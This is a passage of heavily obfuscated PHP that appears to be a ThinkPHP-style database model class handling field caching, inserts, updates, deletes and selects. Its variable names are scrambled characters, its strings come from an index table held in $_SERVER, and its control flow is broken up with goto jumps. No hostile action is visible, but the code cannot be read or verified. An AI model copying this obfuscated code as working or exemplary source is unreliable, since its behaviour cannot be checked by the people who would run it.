think_config($FÆÇÑŠˆŒ[228]); } $this->db(0, empty($this->connection) ? $b³‰Ç¡‘È¸ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $cæôª¤ˆÇ‹ =& $_SERVER[Ä¿Ş°¨]; if (empty($this->fields)) { if (think_config($cæôª¤ˆÇ‹[229])) { $EíÅÏóŒ¥° = $this->dbName ? $this->dbName : think_config($cæôª¤ˆÇ‹[230]); $FÖÃÅĞİˆ = think_var_cache($cæôª¤ˆÇ‹[231] . strtolower(get_path_this($EíÅÏóŒ¥°) . $cæôª¤ˆÇ‹[91] . $this->name)); if ($FÖÃÅĞİˆ) { $DÂ â‘–„ = think_config($cæôª¤ˆÇ‹[232]); if (empty($DÂ â‘–„) || $FÖÃÅĞİˆ[$cæôª¤ˆÇ‹[233]] == $DÂ â‘–„) { $this->fields = $FÖÃÅĞİˆ; return; } } } $this->flush(); } } public function flush() { goto AçÎ‚“‰»œ; cë…òÀ¯°É: if (!$c„ó¬¢‡¨) { return !1; } $this->fields = array_keys($c„ó¬¢‡¨); $this->fields[$F¢¢Â§‹õ[234]] = !1; goto b‰‚éÎÂÜº; AçÎ‚“‰»œ: $F¢¢Â§‹õ =& $_SERVER[Ä¿Ş°¨]; $this->db->setModel($this->name); $c„ó¬¢‡¨ = $this->db->getFields($this->getTableName()); goto cë…òÀ¯°É; b‰‚éÎÂÜº: foreach ($c„ó¬¢‡¨ as $fÔäÓÃôÖ => $a¡–÷Æ‚¶†) { $A¼©ÚĞé°š[$fÔäÓÃôÖ] = $a¡–÷Æ‚¶†[$F¢¢Â§‹õ[29]]; if ($a¡–÷Æ‚¶†[$F¢¢Â§‹õ[36]]) { $this->fields[$F¢¢Â§‹õ[235]] = $fÔäÓÃôÖ; if ($a¡–÷Æ‚¶†[$F¢¢Â§‹õ[39]]) { $this->fields[$F¢¢Â§‹õ[234]] = !0; } } } $this->fields[$F¢¢Â§‹õ[236]] = $A¼©ÚĞé°š; if (think_config($F¢¢Â§‹õ[232])) { $this->fields[$F¢¢Â§‹õ[233]] = think_config($F¢¢Â§‹õ[232]); } goto Cåë¶®¼×÷; Cåë¶®¼×÷: if (think_config($F¢¢Â§‹õ[229])) { $fà¿È—ï = $this->dbName ? $this->dbName : think_config($F¢¢Â§‹õ[230]); think_var_cache($F¢¢Â§‹õ[231] . strtolower(get_path_this($fà¿È—ï) . $F¢¢Â§‹õ[91] . $this->name), $this->fields); } goto AºÅæ­‹; AºÅæ­‹: } public function switchModel($f¥çàç‰‡£, $eˆÇÀ„‰‹… = array()) { $BæğïËÁÇ =& $_SERVER[Ä¿Ş°¨]; $E«Ş¬¹—ÇĞ = ucwords(strtolower($f¥çàç‰‡£)) . $BæğïËÁÇ[237]; if (!class_exists($E«Ş¬¹—ÇĞ)) { think_exception($E«Ş¬¹—ÇĞ . think_lang($BæğïËÁÇ[238])); } $this->_extModel = new $E«Ş¬¹—ÇĞ($this->name); if (!empty($eˆÇÀ„‰‹…)) { foreach ($eˆÇÀ„‰‹… as $fÚĞèÄ£) { $this->_extModel->setProperty($fÚĞèÄ£, $this->{$fÚĞèÄ£}); } } return $this->_extModel; } public function __set($fÖ¬—»œÊ„, $aµ…ÁŞà‚…) { $this->data[$fÖ¬—»œÊ„] = $aµ…ÁŞà‚…; } public function __get($C«ë×ã‘Ô†) { return isset($this->data[$C«ë×ã‘Ô†]) ? $this->data[$C«ë×ã‘Ô†] : null; } public function __isset($eÓÕõÜÇ‚) { return isset($this->data[$eÓÕõÜÇ‚]); } public function __unset($f×è«ïæª) { unset($this->data[$f×è«ïæª]); } public function __call($C¥Å’‚¼À, $B“‡¢ç™ë) { $BŠæ¿™Êª =& $_SERVER[Ä¿Ş°¨]; if (in_array(strtolower($C¥Å’‚¼À), $this->methods, !0)) { $this->options[strtolower($C¥Å’‚¼À)] = $B“‡¢ç™ë[0]; return $this; } elseif (in_array(strtolower($C¥Å’‚¼À), array($BŠæ¿™Êª[239], $BŠæ¿™Êª[240], $BŠæ¿™Êª[241], $BŠæ¿™Êª[242], $BŠæ¿™Êª[243]), !0)) { $f“ÌÛ»„È‚ = isset($B“‡¢ç™ë[0]) ? $B“‡¢ç™ë[0] : $BŠæ¿™Êª[172]; $f“ÌÛ»„È‚ = $this->db->parseKey($f“ÌÛ»„È‚); return $this->getField(strtoupper($C¥Å’‚¼À) . $BŠæ¿™Êª[244] . $f“ÌÛ»„È‚ . $BŠæ¿™Êª[245] . $C¥Å’‚¼À, $BŠæ¿™Êª[239]); } elseif (strtolower(substr($C¥Å’‚¼À, 0, 5)) == $BŠæ¿™Êª[246]) { $f“ÌÛ»„È‚ = think_parse_name(substr($C¥Å’‚¼À, 5)); $c“ó÷¤¸òÉ[$f“ÌÛ»„È‚] = $B“‡¢ç™ë[0]; return $this->where($c“ó÷¤¸òÉ)->find(); } elseif (strtolower(substr($C¥Å’‚¼À, 0, 10)) == $BŠæ¿™Êª[247]) { $dÛ…ª³ªÃ = think_parse_name(substr($C¥Å’‚¼À, 10)); $c“ó÷¤¸òÉ[$dÛ…ª³ªÃ] = $B“‡¢ç™ë[0]; return $this->where($c“ó÷¤¸òÉ)->getField($B“‡¢ç™ë[1]); } elseif (isset($this->_scope[$C¥Å’‚¼À])) { return $this->scope($C¥Å’‚¼À, $B“‡¢ç™ë[0]); } elseif (method_exists($this, $C¥Å’‚¼À)) { array_unshift($B“‡¢ç™ë, $C¥Å’‚¼À); return call_user_func_array(array($this, $BŠæ¿™Êª[248]), $B“‡¢ç™ë); } else { return call_user_func_array(array(parent, $C¥Å’‚¼À), $B“‡¢ç™ë); } } protected function call() { goto eƒÓĞç‘âá; Fªìî¢†‡‰: $Dçó„º¨ª¸ = call_user_func_array(array($this, $DÏğ–×ÇŠŒ), $cÅá¾ÌŒ å); if (method_exists($this, $FÔéÊ¡ĞŠ[252])) { $D­¡Ë‰æœ = call_user_func_array(array($this, $FÔéÊ¡ĞŠ[253]), array($Eà±İ¯ö, $cÅá¾ÌŒ å, $Dçó„º¨ª¸)); if ($D­¡Ë‰æœ) { return $D­¡Ë‰æœ; } } return $Dçó„º¨ª¸; goto BÖ‘º°Â‡; Cµ†àšµéâ: $Eà±İ¯ö = $DÏğ–×ÇŠŒ; if (is_array($DÏğ–×ÇŠŒ)) { $Eà±İ¯ö = $DÏğ–×ÇŠŒ[1]; $DÏğ–×ÇŠŒ = $DÏğ–×ÇŠŒ[0]; } $cÌŸ…Ñ©ì¨ = count($cÅá¾ÌŒ å) - 1; goto c¯ç‹ŠÄéÎ; c¯ç‹ŠÄéÎ: if (isset($cÅá¾ÌŒ å[$cÌŸ…Ñ©ì¨]) && $cÅá¾ÌŒ å[$cÌŸ…Ñ©ì¨] === $DÏğ–×ÇŠŒ) { think_exception(__CLASS__ . $FÔéÊ¡ĞŠ[4] . $DÏğ–×ÇŠŒ . think_lang($FÔéÊ¡ĞŠ[249])); return; } $cÅá¾ÌŒ å[] = $DÏğ–×ÇŠŒ; if (method_exists($this, $FÔéÊ¡ĞŠ[250])) { $D­¡Ë‰æœ = call_user_func_array(array($this, $FÔéÊ¡ĞŠ[251]), array($Eà±İ¯ö, $cÅá¾ÌŒ å)); if (!is_null($D­¡Ë‰æœ) && $D­¡Ë‰æœ !== !1) { return $D­¡Ë‰æœ; } } goto Fªìî¢†‡‰; eƒÓĞç‘âá: $FÔéÊ¡ĞŠ =& $_SERVER[Ä¿Ş°¨]; $cÅá¾ÌŒ å = func_get_args(); $DÏğ–×ÇŠŒ = array_shift($cÅá¾ÌŒ å); goto Cµ†àšµéâ; BÖ‘º°Â‡: } protected function _initialize() { } protected function _facade($BÊìÛé’µ) { $dÜĞè§£¯¼ =& $_SERVER[Ä¿Ş°¨]; if (!empty($this->fields)) { foreach ($BÊìÛé’µ as $eÒÂÑ±Û¹ì => $c”˜Ô’›ÄÈ) { if (!in_array($eÒÂÑ±Û¹ì, $this->fields, !0)) { unset($BÊìÛé’µ[$eÒÂÑ±Û¹ì]); } elseif (is_scalar($c”˜Ô’›ÄÈ)) { $this->_parseType($BÊìÛé’µ, $eÒÂÑ±Û¹ì); } } } if (!empty($this->options[$dÜĞè§£¯¼[254]])) { $BÊìÛé’µ = array_map($this->options[$dÜĞè§£¯¼[254]], $BÊìÛé’µ); unset($this->options[$dÜĞè§£¯¼[254]]); } $this->_beforeWrite($BÊìÛé’µ); return $BÊìÛé’µ; } protected function _beforeWrite(&$C‹©ŞîÛ¨) { } public function add($f‹Ú‹»…‘Í = '', $f†¥ÑÒíƒ = array(), $A§µ·±¥¦Ü = false) { goto a‚£ÏÊØØ½; a‚£ÏÊØØ½: if (empty($f‹Ú‹»…‘Í)) { if (!empty($this->data)) { $f‹Ú‹»…‘Í = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ä¿Ş°¨][255]); return !1; } } $f†¥ÑÒíƒ = $this->_parseOptions($f†¥ÑÒíƒ); $f‹Ú‹»…‘Í = $this->_facade($f‹Ú‹»…‘Í); goto E‚«¼‡Œàƒ; E‚«¼‡Œàƒ: if (!1 === $this->_beforeInsert($f‹Ú‹»…‘Í, $f†¥ÑÒíƒ)) { return !1; } $F›ñêÙ™ÁŞ = $this->db->insert($f‹Ú‹»…‘Í, $f†¥ÑÒíƒ, $A§µ·±¥¦Ü); if (!1 !== $F›ñêÙ™ÁŞ) { $eçæîÏñÂ = $this->getLastInsID(); if ($eçæîÏñÂ) { $f‹Ú‹»…‘Í[$this->getPk()] = $eçæîÏñÂ; $this->_after_insert($f‹Ú‹»…‘Í, $f†¥ÑÒíƒ); return $eçæîÏñÂ; } $this->_after_insert($f‹Ú‹»…‘Í, $f†¥ÑÒíƒ); } goto cªÔÙ—ÍÂ; cªÔÙ—ÍÂ: return $F›ñêÙ™ÁŞ; goto Eßêï”Ñ†‡; Eßêï”Ñ†‡: } protected function _beforeInsert(&$bÔ¤„ÖÖ´, $bô¥øõ¬Üö) { } protected function _after_insert($Aò¶ñÉ¡Ó, $AµÑÉ¼öÓˆ) { } public function addAll($cÒèè‡Ô¯„, $Fö¾ÑŠ¨Ï = array(), $BÄ†’‰™® = false) { goto b‘•ˆ¼ÔÆ; b’ëÖÙ­–§: return $Eì‹Ô§á‰; goto Eà‚ë¦Ò¬á; c°½¿·Ïºí: foreach ($cÒèè‡Ô¯„ as $E‘…¸œ‰îò => $B‹õÚİªñ·) { $cÒèè‡Ô¯„[$E‘…¸œ‰îò] = $this->_facade($B‹õÚİªñ·); } if (method_exists($this->db, $AŠñ¡Ü¿…[256])) { $Eì‹Ô§á‰ = $this->db->insertAll($cÒèè‡Ô¯„, $Fö¾ÑŠ¨Ï, $BÄ†’‰™®); } else { $this->startTrans(); foreach ($cÒèè‡Ô¯„ as $E‘…¸œ‰îò => $B‹õÚİªñ·) { $Eì‹Ô§á‰ = $this->db->insert($B‹õÚİªñ·, $Fö¾ÑŠ¨Ï, $BÄ†’‰™®); } $this->commit(); } if (!1 !== $Eì‹Ô§á‰) { $B—²±´Éë = $this->getLastInsID(); if ($B—²±´Éë) { return $B—²±´Éë; } } goto b’ëÖÙ­–§; b‘•ˆ¼ÔÆ: $AŠñ¡Ü¿… =& $_SERVER[Ä¿Ş°¨]; if (empty($cÒèè‡Ô¯„)) { $this->error = think_lang($AŠñ¡Ü¿…[255]); return !1; } $Fö¾ÑŠ¨Ï = $this->_parseOptions($Fö¾ÑŠ¨Ï); goto c°½¿·Ïºí; Eà‚ë¦Ò¬á: } public function selectAdd($bô¿ôà²÷¡ = '', $f—ïòÙğ  = '', $cŸ¾Ğæè¡© = array()) { $E¨Íïáò– =& $_SERVER[Ä¿Ş°¨]; $cŸ¾Ğæè¡© = $this->_parseOptions($cŸ¾Ğæè¡©); if (!1 === ($fˆŞäªê—Ï = $this->db->selectInsert($bô¿ôà²÷¡ ? $bô¿ôà²÷¡ : $cŸ¾Ğæè¡©[$E¨Íïáò–[257]], $f—ïòÙğ  ? $f—ïòÙğ  : $this->getTableName(), $cŸ¾Ğæè¡©))) { $this->error = think_lang($E¨Íïáò–[258]); return !1; } else { return $fˆŞäªê—Ï; } } public function save($eÄ­ÛµêùØ = '', $E‰ôäø­àâ = array()) { goto B›º¼Ë„©ö; b¹›Í „¡‰: if (!1 !== $CÇÙ°Íˆ¥İ) { if (isset($EáÇ¨É•¼)) { $eÄ­ÛµêùØ[$e‡ŞŒğôÛ] = $EáÇ¨É•¼; } $this->_afterUpdate($eÄ­ÛµêùØ, $E‰ôäø­àâ); } return $CÇÙ°Íˆ¥İ; goto AÇèäß¤êá; aã´êË¯‚¸: $E‰ôäø­àâ = $this->_parseOptions($E‰ôäø­àâ); $e‡ŞŒğôÛ = $this->getPk(); if (!isset($E‰ôäø­àâ[$eĞª¤øÀí×[259]])) { if (isset($eÄ­ÛµêùØ[$e‡ŞŒğôÛ])) { $E÷ò²ÍÌŞ³[$e‡ŞŒğôÛ] = $eÄ­ÛµêùØ[$e‡ŞŒğôÛ]; $E‰ôäø­àâ[$eĞª¤øÀí×[259]] = $E÷ò²ÍÌŞ³; unset($eÄ­ÛµêùØ[$e‡ŞŒğôÛ]); } else { $this->error = think_lang($eĞª¤øÀí×[258]); return !1; } } goto Aùì ‹¬ºÈ; B›º¼Ë„©ö: $eĞª¤øÀí× =& $_SERVER[Ä¿Ş°¨]; if (empty($eÄ­ÛµêùØ)) { if (!empty($this->data)) { $eÄ­ÛµêùØ = $this->data; $this->data = array(); } else { $this->error = think_lang($eĞª¤øÀí×[255]); return !1; } } $eÄ­ÛµêùØ = $this->_facade($eÄ­ÛµêùØ); goto aã´êË¯‚¸; Aùì ‹¬ºÈ: if (is_array($E‰ôäø­àâ[$eĞª¤øÀí×[259]]) && isset($E‰ôäø­àâ[$eĞª¤øÀí×[259]][$e‡ŞŒğôÛ])) { $EáÇ¨É•¼ = $E‰ôäø­àâ[$eĞª¤øÀí×[259]][$e‡ŞŒğôÛ]; } if (!1 === $this->_beforeUpdate($eÄ­ÛµêùØ, $E‰ôäø­àâ)) { return !1; } $CÇÙ°Íˆ¥İ = $this->db->update($eÄ­ÛµêùØ, $E‰ôäø­àâ); goto b¹›Í „¡‰; AÇèäß¤êá: } protected function _beforeUpdate(&$C¥òÈ¡¢®­, $BÕÑíçÈ—) { } protected function _afterUpdate($cäµ¸˜´ÙÆ, $A‡ÉÙëİÓ) { } public function delete($CáÔ‹¥”« = array()) { goto A‚èø´Èù; b¼Ñ¬•œÒß: if (is_numeric($CáÔ‹¥”«) || is_string($CáÔ‹¥”«)) { if (strpos($CáÔ‹¥”«, $aÂˆ¿áÄ ô[47])) { $A¾óÜƒ‰¡[$B‰ñšÈî] = array($aÂˆ¿áÄ ô[260], $CáÔ‹¥”«); } else { $A¾óÜƒ‰¡[$B‰ñšÈî] = $CáÔ‹¥”«; } $this->options[$aÂˆ¿áÄ ô[259]] = $A¾óÜƒ‰¡; } $CáÔ‹¥”« = $this->_parseOptions(); if (is_array($CáÔ‹¥”«[$aÂˆ¿áÄ ô[259]]) && isset($CáÔ‹¥”«[$aÂˆ¿áÄ ô[259]][$B‰ñšÈî])) { $c‘Ö‚¦Ê = $CáÔ‹¥”«[$aÂˆ¿áÄ ô[259]][$B‰ñšÈî]; } goto bá¦ÎµÇå¨; A‚èø´Èù: $aÂˆ¿áÄ ô =& $_SERVER[Ä¿Ş°¨]; if (empty($CáÔ‹¥”«) && empty($this->options[$aÂˆ¿áÄ ô[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $B‰ñšÈî = $this->getPk(); goto b¼Ñ¬•œÒß; bá¦ÎµÇå¨: $D—Ÿª¬»é = $this->db->delete($CáÔ‹¥”«); if (!1 !== $D—Ÿª¬»é) { $eã®ˆÃï¼› = array(); if (isset($c‘Ö‚¦Ê)) { $eã®ˆÃï¼›[$B‰ñšÈî] = $c‘Ö‚¦Ê; } $this->_after_delete($eã®ˆÃï¼›, $CáÔ‹¥”«); } return $D—Ÿª¬»é; goto fäÚãæ; fäÚãæ: } protected function _after_delete($F¼‡Œ–õ¤è, $Dº«×œ“’÷) { } public function select($b›Æ°Œ÷Ò = array()) { goto B¤î‚ŞëÆó; CÉš™µ÷°: $EìöãÉŒæ = $this->db->select($b›Æ°Œ÷Ò); if (!1 === $EìöãÉŒæ) { return !1; } if (empty($EìöãÉŒæ)) { return null; } goto eİæ½”×Ş; B¤î‚ŞëÆó: $eµ“§Š‹ó =& $_SERVER[Ä¿Ş°¨]; if (is_string($b›Æ°Œ÷Ò) || is_numeric($b›Æ°Œ÷Ò)) { $e¬±õºõ³« = $this->getPk(); if (strpos($b›Æ°Œ÷Ò, $eµ“§Š‹ó[47])) { $E·èêï¦°è[$e¬±õºõ³«] = array($eµ“§Š‹ó[260], $b›Æ°Œ÷Ò); } else { $E·èêï¦°è[$e¬±õºõ³«] = $b›Æ°Œ÷Ò; } $this->options[$eµ“§Š‹ó[259]] = $E·èêï¦°è; } elseif (!1 === $b›Æ°Œ÷Ò) { $b›Æ°Œ÷Ò = $this->_parseOptions(); return $eµ“§Š‹ó[261] . $this->db->buildSelectSql($b›Æ°Œ÷Ò) . $eµ“§Š‹ó[262]; } $b›Æ°Œ÷Ò = $this->_parseOptions(); goto CÉš™µ÷°; eİæ½”×Ş: $this->_afterSelect($EìöãÉŒæ, $b›Æ°Œ÷Ò); return $EìöãÉŒæ; goto F³†ğòÖØº; F³†ğòÖØº: } protected function _afterSelect(&$d¨´Úç˜’°, $fœÌ¢¢Ãø) { } public function buildSql($Cİ‘µƒ¼İØ = array()) { $C“ÔÆ§ã¬¹ =& $_SERVER[Ä¿Ş°¨]; $Cİ‘µƒ¼İØ = $this->_parseOptions($Cİ‘µƒ¼İØ); return $C“ÔÆ§ã¬¹[261] . $this->db->buildSelectSql($Cİ‘µƒ¼İØ) . $C“ÔÆ§ã¬¹[262]; } public function optionsValue($d™òİ°‰Ï¢ = null) { if (is_null($d™òİ°‰Ï¢)) { return $this->options; } elseif (is_array($d™òİ°‰Ï¢)) { $this->options = array_merge($this->options, $d™òİ°‰Ï¢); } } protected function _parseOptions($AÊ½è†«ŸÕ = array()) { goto fŞÄÆ·ùÈ; EŸÜï’Ñ…ˆ: if (isset($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[259]]) && is_array($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[259]]) && !empty($b«–Èß£Úğ) && !isset($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[266]]) && !isset($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[263]])) { foreach ($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[259]] as $a§Ò¾¹Ú¬ù => $a¿ä¨ëÌÇâ) { $a§Ò¾¹Ú¬ù = trim($a§Ò¾¹Ú¬ù); if (in_array($a§Ò¾¹Ú¬ù, $b«–Èß£Úğ, !0)) { if (is_scalar($a¿ä¨ëÌÇâ)) { $this->_parseType($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[259]], $a§Ò¾¹Ú¬ù); } } elseif (!is_numeric($a§Ò¾¹Ú¬ù) && $C—ñè°ˆŸ´[70] != substr($a§Ò¾¹Ú¬ù, 0, 1) && !1 === strpos($a§Ò¾¹Ú¬ù, $C—ñè°ˆŸ´[91]) && !1 === strpos($a§Ò¾¹Ú¬ù, $C—ñè°ˆŸ´[244]) && !1 === strpos($a§Ò¾¹Ú¬ù, $C—ñè°ˆŸ´[267]) && !1 === strpos($a§Ò¾¹Ú¬ù, $C—ñè°ˆŸ´[268])) { unset($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[259]][$a§Ò¾¹Ú¬ù]); } } } $this->_options_filter($AÊ½è†«ŸÕ); return $AÊ½è†«ŸÕ; goto c¬Şï–µ°Ù; fŞÄÆ·ùÈ: $C—ñè°ˆŸ´ =& $_SERVER[Ä¿Ş°¨]; if (is_array($AÊ½è†«ŸÕ)) { $AÊ½è†«ŸÕ = array_merge($this->options, $AÊ½è†«ŸÕ); } $this->options = array(); goto f—–Ìç¼ºì; f—–Ìç¼ºì: if (!isset($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[263]])) { $AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[263]] = $this->getTableName(); $b«–Èß£Úğ = $this->fields; } else { $b«–Èß£Úğ = $this->getDbFields(); } if (!empty($AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[264]])) { $AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[263]] .= $C—ñè°ˆŸ´[50] . $AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[264]]; } $AÊ½è†«ŸÕ[$C—ñè°ˆŸ´[265]] = $this->name; goto EŸÜï’Ñ…ˆ; c¬Şï–µ°Ù: } protected function _options_filter(&$Cô’ò İ ) { } protected function _parseType(&$cª« ªÚÏ¦, $Eã‘ØšÛà) { $AêÍÁ… =& $_SERVER[Ä¿Ş°¨]; if (empty($this->options[$AêÍÁ…[269]][$AêÍÁ…[4] . $Eã‘ØšÛà])) { $D¨Òë³ïù¨ = strtolower($this->fields[$AêÍÁ…[236]][$Eã‘ØšÛà]); if (!1 !== strpos($D¨Òë³ïù¨, $AêÍÁ…[270])) { } elseif (!1 === strpos($D¨Òë³ïù¨, $AêÍÁ…[271]) && !1 !== strpos($D¨Òë³ïù¨, $AêÍÁ…[272])) { $cª« ªÚÏ¦[$Eã‘ØšÛà] = intval($cª« ªÚÏ¦[$Eã‘ØšÛà]); } elseif (!1 !== strpos($D¨Òë³ïù¨, $AêÍÁ…[273]) || !1 !== strpos($D¨Òë³ïù¨, $AêÍÁ…[274])) { $cª« ªÚÏ¦[$Eã‘ØšÛà] = floatval($cª« ªÚÏ¦[$Eã‘ØšÛà]); } elseif (!1 !== strpos($D¨Òë³ïù¨, $AêÍÁ…[275])) { $cª« ªÚÏ¦[$Eã‘ØšÛà] = (bool) $cª« ªÚÏ¦[$Eã‘ØšÛà]; } } } public function find($d¾ÙËÙ„¬Ë = array()) { goto CçóÒŒ˜ø‰; cîÖ›ª´º: if (!empty($this->options[$AçÃÆİìë[277]])) { return $this->returnResult($this->data, $this->options[$AçÃÆİìë[277]]); } return $this->data; goto D–İõ–Óğİ; CçóÒŒ˜ø‰: $AçÃÆİìë =& $_SERVER[Ä¿Ş°¨]; if (is_numeric($d¾ÙËÙ„¬Ë) || is_string($d¾ÙËÙ„¬Ë)) { $DÇ–¥‘ÍÖ[$this->getPk()] = intval($d¾ÙËÙ„¬Ë); $this->options[$AçÃÆİìë[259]] = $DÇ–¥‘ÍÖ; } $this->options[$AçÃÆİìë[276]] = 1; goto FÉï‡éˆƒË; bôœ‚òŞÊ: if (empty($bí““Ïáæ)) { return null; } $this->data = $bí““Ïáæ[0]; $this->_afterFind($this->data, $d¾ÙËÙ„¬Ë); goto cîÖ›ª´º; FÉï‡éˆƒË: $d¾ÙËÙ„¬Ë = $this->_parseOptions(); $bí““Ïáæ = $this->db->select($d¾ÙËÙ„¬Ë); if (!1 === $bí““Ïáæ) { return !1; } goto bôœ‚òŞÊ; D–İõ–Óğİ: } protected function _afterFind(&$D—˜’µ™, $d·‰ß¸‡Ñ´) { } protected function returnResult($eƒ¬²ëµ­, $BÔ­Ç„¤Ò = '') { $eÆêÁ±Ø  =& $_SERVER[Ä¿Ş°¨]; if ($BÔ­Ç„¤Ò) { if (is_callable($BÔ­Ç„¤Ò)) { return call_user_func($BÔ­Ç„¤Ò, $eƒ¬²ëµ­); } switch (strtolower($BÔ­Ç„¤Ò)) { case $eÆêÁ±Ø [278]: return json_encode($eƒ¬²ëµ­); case $eÆêÁ±Ø [279]: return xml_encode($eƒ¬²ëµ­); } } return $eƒ¬²ëµ­; } public function parseFieldsMap($d›‚ôÇÀ‘, $fµäçØ¨Ş = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Eêæ˜Œ‚²Ü => $bÖ®Ø¯ˆùÁ) { if ($fµäçØ¨Ş == 1) { if (isset($d›‚ôÇÀ‘[$bÖ®Ø¯ˆùÁ])) { $d›‚ôÇÀ‘[$Eêæ˜Œ‚²Ü] = $d›‚ôÇÀ‘[$bÖ®Ø¯ˆùÁ]; unset($d›‚ôÇÀ‘[$bÖ®Ø¯ˆùÁ]); } } else { if (isset($d›‚ôÇÀ‘[$Eêæ˜Œ‚²Ü])) { $d›‚ôÇÀ‘[$bÖ®Ø¯ˆùÁ] = $d›‚ôÇÀ‘[$Eêæ˜Œ‚²Ü]; unset($d›‚ôÇÀ‘[$Eêæ˜Œ‚²Ü]); } } } } return $d›‚ôÇÀ‘; } public function setField($dê°•Ú±²¢, $F—ã±Í† = '') { if (is_array($dê°•Ú±²¢)) { $cõÊé‡®¼» = $dê°•Ú±²¢; } else { $cõÊé‡®¼»[$dê°•Ú±²¢] = $F—ã±Í†; } return $this->save($cõÊé‡®¼»); } public function setAdd($fò¢äŸã×Ï, $a¤´Ã¶Ä¹Ó = 1) { $B˜ˆ†Ã´äÊ =& $_SERVER[Ä¿Ş°¨]; $CèéÛ‘Åíœ = $fò¢äŸã×Ï . $B˜ˆ†Ã´äÊ[280] . $a¤´Ã¶Ä¹Ó; if ($a¤´Ã¶Ä¹Ó < 0) { $CèéÛ‘Åíœ = $fò¢äŸã×Ï . $a¤´Ã¶Ä¹Ó; } return $this->setField($fò¢äŸã×Ï, array($B˜ˆ†Ã´äÊ[281], $CèéÛ‘Åíœ)); } public function getField($A‘ÇØ¯œ²Ö, $bá®Ï…ğ»É = null) { $F½ÚÍÈ™Š… =& $_SERVER[Ä¿Ş°¨]; $b§ß¥¯å¿[$F½ÚÍÈ™Š…[257]] = $A‘ÇØ¯œ²Ö; $b§ß¥¯å¿ = $this->_parseOptions($b§ß¥¯å¿); $A‘ÇØ¯œ²Ö = trim($A‘ÇØ¯œ²Ö); if (strpos($A‘ÇØ¯œ²Ö, $F½ÚÍÈ™Š…[47])) { if (!isset($b§ß¥¯å¿[$F½ÚÍÈ™Š…[276]])) { $b§ß¥¯å¿[$F½ÚÍÈ™Š…[276]] = is_numeric($bá®Ï…ğ»É) ? $bá®Ï…ğ»É : $F½ÚÍÈ™Š…[33]; } $CÚ”ˆº¶›‚ = $this->db->select($b§ß¥¯å¿); if (!empty($CÚ”ˆº¶›‚)) { goto Fñˆã„ÖÏ; AÕˆ‡Ü™±—: $cÀ‚Óƒ°± = array_shift($A‘ÇØ¯œ²Ö); $FÏÂ–¥¼ß… = array(); $aÕææí»Ù = count($aìˆÔ±ğ­é); goto CĞ¹©¨ä‰ƒ; CĞ¹©¨ä‰ƒ: foreach ($CÚ”ˆº¶›‚ as $A„‘¶ìäãÊ) { $fßŠ¨ß¾æ = $A„‘¶ìäãÊ[$fäÚåÅÚŠ]; if (2 == $aÕææí»Ù) { $FÏÂ–¥¼ß…[$fßŠ¨ß¾æ] = $A„‘¶ìäãÊ[$cÀ‚Óƒ°±]; } else { $FÏÂ–¥¼ß…[$fßŠ¨ß¾æ] = is_string($bá®Ï…ğ»É) ? implode($bá®Ï…ğ»É, $A„‘¶ìäãÊ) : $A„‘¶ìäãÊ; } } return $FÏÂ–¥¼ß…; goto cöî¯ø±å¬; Fñˆã„ÖÏ: $aìˆÔ±ğ­é = explode($F½ÚÍÈ™Š…[47], $A‘ÇØ¯œ²Ö); $A‘ÇØ¯œ²Ö = array_keys($CÚ”ˆº¶›‚[0]); $fäÚåÅÚŠ = array_shift($A‘ÇØ¯œ²Ö); goto AÕˆ‡Ü™±—; cöî¯ø±å¬: } } else { if (!0 !== $bá®Ï…ğ»É) { $b§ß¥¯å¿[$F½ÚÍÈ™Š…[276]] = is_numeric($bá®Ï…ğ»É) ? $bá®Ï…ğ»É : 1; } if ($bá®Ï…ğ»É === $F½ÚÍÈ™Š…[239]) { unset($b§ß¥¯å¿[$F½ÚÍÈ™Š…[276]]); } $A„‘¶ìäãÊ = $this->db->select($b§ß¥¯å¿); if (!empty($A„‘¶ìäãÊ)) { if ($bá®Ï…ğ»É === $F½ÚÍÈ™Š…[239]) { return reset($A„‘¶ìäãÊ[0]); } if (!0 !== $bá®Ï…ğ»É && 1 == $b§ß¥¯å¿[$F½ÚÍÈ™Š…[276]]) { return reset($A„‘¶ìäãÊ[0]); } foreach ($A„‘¶ìäãÊ as $eæšìÂîË) { $e›†êŠ©‘™[] = $eæšìÂîË[$A‘ÇØ¯œ²Ö]; } return $e›†êŠ©‘™; } } return null; } public function create($EëâôàÈ£ = '', $fÆ©…‰‚ = '') { goto bêš’ßîƒï; AÆäÑîôî: if (isset($a–äî±ÑÇä)) { if (is_string($a–äî±ÑÇä)) { $a–äî±ÑÇä = explode($a†‘¾§Ö“ù[47], $a–äî±ÑÇä); } if (think_config($a†‘¾§Ö“ù[282])) { $a–äî±ÑÇä[] = think_config($a†‘¾§Ö“ù[283]); } foreach ($EëâôàÈ£ as $BÅä¿÷âÜ› => $A¾‹„˜ô‡) { if (!in_array($BÅä¿÷âÜ›, $a–äî±ÑÇä)) { unset($EëâôàÈ£[$BÅä¿÷âÜ›]); } } } if (!$this->autoValidation($EëâôàÈ£, $fÆ©…‰‚)) { return !1; } if (!$this->autoCheckToken($EëâôàÈ£)) { $this->error = think_lang($a†‘¾§Ö“ù[284]); return !1; } goto bİ…Õ¦ˆóç; fï¤ê¼Æë‰: $EëâôàÈ£ = $this->parseFieldsMap($EëâôàÈ£, 0); $fÆ©…‰‚ = $fÆ©…‰‚ ? $fÆ©…‰‚ : (!empty($EëâôàÈ£[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$a†‘¾§Ö“ù[257]])) { $a–äî±ÑÇä = $this->options[$a†‘¾§Ö“ù[257]]; 